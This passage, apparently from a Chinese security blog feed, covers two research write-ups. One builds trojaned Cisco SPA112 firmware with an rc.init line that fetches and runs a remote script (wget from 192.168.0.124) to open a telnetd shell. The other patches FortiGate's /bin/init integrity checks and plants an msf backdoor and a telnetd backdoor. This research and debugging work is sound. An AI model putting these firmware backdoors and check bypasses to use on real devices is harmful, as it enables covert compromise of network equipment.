<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># /etc/rc.init.1 , should create necessary directory and load the driver</span></span><br><span class="line"><span class="comment"># please don&#x27;t access nvram here, or modfiy any other env variable code here</span></span><br><span class="line"><span class="comment"># - by wenij</span></span><br><span class="line">$(/bin/sleep 60 &amp;&amp; /bin/busybox wget -O /tmp/1.sh http://192.168.0.124:8000/1.sh &amp;&amp; /bin/busybox <span class="built_in">chmod</span> 777 /tmp/1.sh &amp;&amp; /tmp/1.sh) &amp;</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">&quot;/var/tmp/events&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">mkdir</span> /var/tmp/events</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<p>修改完成，使用之前编译的 mksquashfs 重新打包，确保打包之后的文件不大于原始文件，然后拼接回原来的固件末尾，补齐至原始长度。</p>
<p>现在，如果将这个重新打包好的固件刷入设备，重启之后将会进入 “救援模式”，提示之前传入的固件无法正常启动，请重新刷写。</p>
<p>因此除了简单修改文件系统之外，我们还需要调整固件中的其他结构，以满足升级逻辑。继续分析 upgrade.cgi，在函数开头部分会执行一些命令</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v100 = dword_623C8;</span><br><span class="line">system(<span class="string">&quot;cp /usr/sbin/splitfmwr /tmp/splitfmwr&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( a1 )</span><br><span class="line">&#123;</span><br><span class="line">  v116[<span class="number">0</span>] = <span class="string">&quot;/tmp/splitfmwr&quot;</span>;</span><br><span class="line">  v116[<span class="number">1</span>] = <span class="string">&quot;-u&quot;</span>;</span><br><span class="line">  v116[<span class="number">2</span>] = <span class="string">&quot;/home/usb_disk/pb_usb_drive.tgz&quot;</span>;</span><br><span class="line">  v116[<span class="number">3</span>] = <span class="string">&quot;-p&quot;</span>;</span><br><span class="line">  v116[<span class="number">4</span>] = <span class="string">&quot;/tmp/pfmwr.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">5</span>] = <span class="string">&quot;-b&quot;</span>;</span><br><span class="line">  v116[<span class="number">6</span>] = <span class="string">&quot;/tmp/bootldr.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">7</span>] = <span class="string">&quot;-s&quot;</span>;</span><br><span class="line">  v116[<span class="number">8</span>] = <span class="string">&quot;/tmp/sfmwr.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">9</span>] = <span class="string">&quot;-h&quot;</span>;</span><br><span class="line">  v116[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">  v116[<span class="number">10</span>] = <span class="string">&quot;/tmp/SPA_HS.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">11</span>] = a1;</span><br><span class="line">  v10 = eval(v116, <span class="string">&quot;&gt;/dev/console&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v12 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = &amp;v107;</span><br><span class="line">    v12 = <span class="number">-9</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v127 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v11 + <span class="number">281</span>) = v12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v118[<span class="number">0</span>] = <span class="string">&quot;/tmp/write&quot;</span>;</span><br><span class="line">    v118[<span class="number">1</span>] = <span class="string">&quot;/tmp/pfmwr.img&quot;</span>;</span><br><span class="line">    v118[<span class="number">2</span>] = <span class="string">&quot;ROMIMAGE&quot;</span>;</span><br><span class="line">    v118[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v10 = eval(v118, <span class="string">&quot;&gt;/dev/console&quot;</span>, v12, v12);</span><br><span class="line">    v127 = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  libupg_release_upglock(v10);</span><br><span class="line">  <span class="keyword">return</span> v127;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据名称来猜测，splitfmwr 程序切割固件，将其分为 n 个部分，而 write 程序执行实际的写入闪存操作。</p>
<p>那么主要的固件验证逻辑应该就位于 splitfmwr 程序中，这个程序比较复杂，它会根据固件头部尝试将固件切割，对于正常的固件，理论上会切割出 bootloader、内核、文件系统等。这些不同的部分称之为 module，多个 module 组成了一个 pack，固件头部包含 n 个 MD5 值，用于校验固件中的各个组成部分。</p>
<p>对于这些结构我们可以尝试逐步分析，直到写出一个可用的打包程序。不过在查看 GPL 代码时，发现其中包含两个项目：pkger 和 moduler，它们正是用于打包 SPA112 固件的工具。将这两个工具编译出来，在原始固件上能够正常解析</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  repack ./tools/pkger -r ./ori.bin         </span><br><span class="line">Firmware version:     1.4.1</span><br><span class="line">Firmware modules:     1</span><br><span class="line">Firmware length:      10092936</span><br></pre></td></tr></table></figure></div>

<p>这样，可以节省我们很多精力，参考 GPL 中的打包脚本结合各个工具，可快速制作出符合升级要求的固件。</p>
<p>在本地构造 1.sh，并准备好 busybox 程序，开启 python web 服务</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/bin/busybox wget -O /tmp/busybox http://192.168.0.124:8000/busybox</span><br><span class="line">/bin/busybox <span class="built_in">chmod</span> 777 /tmp/busybox</span><br><span class="line">/tmp/busybox telnetd -l/bin/sh -p12345</span><br></pre></td></tr></table></figure></div>

<p>将构造好的固件刷入设备：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/spa112-1.png"
                     
                ></p>
<p>升级完成出现以下画面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/spa112-2.png"
                     
                ></p>
<p>等待设备重新启动，如果一切正常，在 python 服务器端可以收到下载文件的请求，之后连接设备的 12345 端口即可得到 shell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/spa112-3.png"
                     
                ></p>
<p>本文我们简单分析了 Cisco SPA112 语音网关的漏洞，尝试使用厂商开源的 GPL 工具构造恶意固件，植入木马后获取代码执行权限。<a class="link"   href="https://github.com/rrrrrrri/spa112-tools" >相关工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>搭建 FortiGate 调试环境 (一)</title>
    <url>/2023/03/02/fortigate_debug_env1/</url>
    <content><![CDATA[<p>关于如何获取 FortiGate shell 权限以及如何完成 License 授权验证。(一)</p>
<span id="more"></span>

<h2 id="处理判断逻辑"><a href="#处理判断逻辑" class="headerlink" title="处理判断逻辑"></a>处理判断逻辑</h2><p>本博客某历史文章中提到过一篇<a class="link"   href="https://www.cnblogs.com/studyskill/p/6524672.html" >参考资料<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，不过这篇资料是针对旧版本 FortiGate 的，Fortinet 曾在 2019 年 11 月 14 日发布了一个影响 FortiGate 的 <a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-19-017" >CVE<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在这个漏洞的描述中，官方认为 VM 应用缺少对文件系统的检查，可能导致攻击者向系统中注入恶意程序。为此在启动流程中添加了文件系统校验，按照参考资料的步骤修改系统文件之后可能会导致无法启动或者无限重启。</p>
<p>对于这个问题，我们首先想到的是定位检查逻辑，看看能否根据算法打包出正确的文件或者直接将检查逻辑 patch 掉。先看一下系统启动时的输出信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_1.png"
                     
                ></p>
<p>考虑文件系统的校验可能是在内核或者用户态实现，我们首先在文件系统中尝试搜索 System is starting 字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_2.png"
                     
                ></p>
<p>在二进制文件 bin&#x2F;init 中找到了匹配，逆向该文件看看这个字符串是何时打印的：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  t_printf(<span class="string">&quot;\nSystem is starting...\n&quot;</span>, v11, v8, v12, v5, v6, requested_time.tv_sec);<span class="comment">// 打印字符串</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  sub_206FB40();</span><br><span class="line">  reboot(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  sub_44DE80(<span class="number">0</span>);</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  setsid();</span><br><span class="line">  v14 = sub_44DDF0(<span class="string">&quot;/dev/null&quot;</span>);</span><br><span class="line">  v15 = v14;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dup2(v14, <span class="number">0</span>);</span><br><span class="line">    dup2(v15, <span class="number">1</span>);</span><br><span class="line">    dup2(v15, <span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_290E8D0(<span class="number">1024LL</span>, <span class="number">1LL</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    t_printf(<span class="string">&quot;could not setup epoll in init.\n&quot;</span>, <span class="number">1</span>, v16, v17, v18, v19, requested_time.tv_sec);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_452C00() &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_450A80();</span><br><span class="line">    sub_1F6CD90(<span class="number">16</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">2649</span>, <span class="string">&quot;main&quot;</span>, v20, requested_time.tv_sec);</span><br><span class="line">    sub_44E2D0(<span class="number">1LL</span>);</span><br><span class="line">    sub_451670();</span><br><span class="line">    sub_450BC0();</span><br><span class="line">    <span class="keyword">if</span> ( sub_44F240() )</span><br><span class="line">      do_halt();</span><br><span class="line">    <span class="keyword">if</span> ( !sub_44F1A0() )</span><br><span class="line">      do_halt();</span><br><span class="line">    <span class="keyword">if</span> ( sub_2745D50() )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_2825E00();</span><br><span class="line">      <span class="keyword">if</span> ( sub_44DFC0(<span class="string">&quot;/bin/fips_self_test&quot;</span>) )</span><br><span class="line">        do_halt();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_44F1F0() )</span><br><span class="line">        do_halt();</span><br><span class="line">      sub_2781560();</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>我们看到在 init 程序的 main 函数中第 82 行位置打印了此字符串，而向下分析发现有几处判断，其中比较明显的位置引用了 &#x2F;bin&#x2F;fips_self_test 字符串。do_halt 函数的内容：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">do_halt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">requested_time</span>;</span> <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_451FA0(<span class="string">&quot;do_halt&quot;</span>, <span class="number">1388</span>);</span><br><span class="line">  v0 = fopen(<span class="string">&quot;/etc/shutdown.dat&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v0;</span><br><span class="line">    <span class="built_in">fprintf</span>(v0, <span class="string">&quot;%d&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">    fclose(v1);</span><br><span class="line">    sync();</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_44EF50();</span><br><span class="line">  v2 = open(<span class="string">&quot;/dev/console&quot;</span>, <span class="number">2305</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dprintf(v2, <span class="string">&quot;\r\nThe system is halted.\r\n&quot;</span>);</span><br><span class="line">    fsync(v3);</span><br><span class="line">    close(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  requested_time.tv_sec = <span class="number">2LL</span>;</span><br><span class="line">  requested_time.tv_nsec = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( nanosleep(&amp;requested_time, &amp;requested_time) == <span class="number">-1</span> &amp;&amp; *__errno_location() == <span class="number">4</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    reboot(<span class="number">1126301404</span>);</span><br><span class="line">  <span class="keyword">while</span> ( pause() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里会输出信息 The system is halted，表示系统已停止运行。</p>
<p>第一个判断函数内部执行了 ioctl 和 socket 等函数，向内核发送或接收某些信息</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_2907930</span><span class="params">(<span class="type">int</span> a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_468D350 &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> ioctl(dword_468D350, a1, a2);</span><br><span class="line">  v2 = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = ioctl(v2, a1, a2);</span><br><span class="line">  close(v3);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第二个函数 fork 出一个子进程，主要处理逻辑：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">sub_447D40</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// dl</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  FILE *v6; <span class="comment">// rax</span></span><br><span class="line">  FILE *v7; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  FILE *v9; <span class="comment">// r13</span></span><br><span class="line">  _BOOL8 v10; <span class="comment">// r12</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// r15</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">void</span> *v15; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v16; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">size_t</span> v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+0h] [rbp-F0h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v21; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 *v22; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">void</span> *v23; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+28h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v25[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> filename[<span class="number">8</span>]; <span class="comment">// [rsp+50h] [rbp-A0h] BYREF</span></span><br><span class="line">  __int16 v27; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 ptr[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">97</span>;</span><br><span class="line">  v1 = <span class="number">78</span>;</span><br><span class="line">  ptr[<span class="number">9</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *filename = <span class="number">0x42F1C441217474E</span>LL;</span><br><span class="line">  <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;aiqu0oZi&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; v0 = *(ptr + i) )</span><br><span class="line">  &#123;</span><br><span class="line">    v25[i++] = v0 ^ v1;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = filename[i];</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">97</span>;</span><br><span class="line">  v4 = <span class="number">78</span>;</span><br><span class="line">  v24 = <span class="number">0x42F1C441217474E</span>LL;</span><br><span class="line">  <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;aiqu0oZi&quot;</span>);</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v25[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    filename[v5++] = v3 ^ v4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = *(&amp;v24 + v5);</span><br><span class="line">    v3 = *(ptr + v5);</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = <span class="number">50</span>;</span><br><span class="line">  v6 = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &amp;&amp; (v8 = fread(ptr, <span class="number">1uLL</span>, <span class="number">0x40</span>uLL, v6), fclose(v7), v8 &gt; <span class="number">0</span>) &amp;&amp; (v9 = fopen(v25, <span class="string">&quot;r&quot;</span>)) != <span class="number">0LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v10) = <span class="number">0</span>;</span><br><span class="line">    v23 = &amp;unk_3FAC280;</span><br><span class="line">    v11 = d2i_PUBKEY(<span class="number">0LL</span>, &amp;v23, <span class="number">294LL</span>);</span><br><span class="line">    v12 = v11;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = EVP_PKEY_get1_RSA(v11);</span><br><span class="line">      v14 = v13;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = &amp;v19;</span><br><span class="line">        n = RSA_size(v13);</span><br><span class="line">        v15 = alloca(n);</span><br><span class="line">        v21 = &amp;v19;</span><br><span class="line">        v16 = alloca(RSA_size(v14));</span><br><span class="line">        v17 = fread(v21, <span class="number">1uLL</span>, n, v9);</span><br><span class="line">        <span class="keyword">if</span> ( RSA_public_decrypt(v17, v21, &amp;v19, v14, <span class="number">1LL</span>) == v8 )</span><br><span class="line">          v10 = <span class="built_in">memcmp</span>(ptr, &amp;v19, v8) == <span class="number">0</span>;</span><br><span class="line">        RSA_free(v14);</span><br><span class="line">      &#125;</span><br><span class="line">      EVP_PKEY_free(v12);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v10) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数开头通过异或运算处理了一个字符串，解密之后得到结果 <code>/.fgtsum</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_3.png"
                     
                ></p>
<p>在根目录能找到这个文件，那么显然此函数就是利用该文件实现了某些系统校验。</p>
<p>第三个函数(sub_2745D50)似乎和 FIPS 模式相关，FIPS 简单来说是美国政府针对计算机系统定义的一种标准化信息处理方式，旨在提升信息的安全性。第四个函数(sub_44F1F0)同样 fork 出了子进程，相关逻辑</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_2780BD0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  _BOOL8 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">268</span>]; <span class="comment">// [rsp+10h] [rbp-130h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+11Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+11Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v5, &amp;off_35CFDC0, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  v6 = <span class="number">256</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v4 = v5;</span><br><span class="line">  v1 = d2i_RSAPublicKey(<span class="number">0LL</span>, &amp;v4, <span class="number">270LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp;&amp; (v2 = v1, !sub_2746F20(<span class="string">&quot;/data/rootfs.gz&quot;</span>, <span class="string">&quot;/data/rootfs.gz.chk&quot;</span>, a1, v1)) )</span><br><span class="line">    result = sub_2746F20(<span class="string">&quot;/data/flatkc&quot;</span>, <span class="string">&quot;/data/flatkc.chk&quot;</span>, a1, v2) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数实现对 rootfs.gz 的判断。</p>
<p>到这里可以大体推断文件系统的校验是在用户态程序 &#x2F;bin&#x2F;init 中实现的。相关逻辑并不复杂，我们可以深入研究以便于打包一份合适的 rootfs.gz 通过校验，或者采用更简单的方法即 patch 掉校验逻辑。</p>
<p>经过验证，只需要 patch fgtsum 和 rootfs 两个检验即可，将对应跳转指令取反，保存并替换原始文件。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sub_44F240() )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( sub_44F1A0(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( sub_2745D50() )</span><br><span class="line">&#123;</span><br><span class="line">  sub_2825E00();</span><br><span class="line">  <span class="keyword">if</span> ( sub_44DFC0(<span class="string">&quot;/bin/fips_self_test&quot;</span>) )</span><br><span class="line">    do_halt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_44F1F0(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) )</span><br><span class="line">    do_halt();</span><br><span class="line">  sub_2781560();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>或者，我们使用更简单的补丁，直接将 do_halt 函数的第一条指令改为 ret，这样就算无法通过验证，也不会执行重启操作。</p>
<h2 id="植入后门并启动"><a href="#植入后门并启动" class="headerlink" title="植入后门并启动"></a>植入后门并启动</h2><p>后续的操作和参考文章提到的类似，先用 msf 生成一个后门程序，替换 &#x2F;bin&#x2F;smartctl 文件，然后将 patch 的 init 程序替换 &#x2F;bin&#x2F;init，同时在系统中放置一个 busybox 并将 &#x2F;bin&#x2F;sh 指向 busybox 方便后续使用。</p>
<p>根据前面的文章我们知道系统启动时会首先执行 &#x2F;sbin&#x2F;init，这个程序的逻辑很简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  argv[<span class="number">3</span>] = (<span class="type">char</span> *)__readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4017D0(a1, a2, a3);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/init.chk&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sub_401AD0(<span class="string">&quot;bin&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)sub_401AD0(<span class="string">&quot;migadmin&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)sub_401AD0(<span class="string">&quot;node-scripts&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    sub_401AD0(<span class="string">&quot;usr&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  execve(<span class="string">&quot;/bin/init&quot;</span>, argv, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它负责解压各个压缩包并唤起 &#x2F;bin&#x2F;init 继续执行，没有其他操作。方便起见我们跳过重新打包 xxx.tar.xz 的步骤，在系统启动过程中调试内核并修改内核参数，让它直接去执行 &#x2F;bin&#x2F;init 程序。</p>
<p>打包命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">find . | cpio -H newc -o &gt; ../rootfs.raw</span><br><span class="line"><span class="built_in">cat</span> ./rootfs.raw | gzip &gt; rootfs.gz</span><br></pre></td></tr></table></figure></div>

<p>将新的 rootfs.gz 替换到磁盘中，挂载到原先系统上，并添加调试桥。</p>
<p>启动时用 gdb 附加，并定位到执行用户空间程序位置：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_4.png"
                     
                ></p>
<p>此时执行的目标程序为 &#x2F;sbin&#x2F;init</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_5.png"
                     
                ></p>
<p>我们将其修改成 &#x2F;bin&#x2F;init，然后继续执行，系统将正常启动，执行命令 <code>diagnose hardware smartctl</code> 即可触发后门程序。由于设备存在防火墙，端口不能随便访问，我们将其自带的 sshd 服务 kill 掉并替换成 telnetd 后门</p>
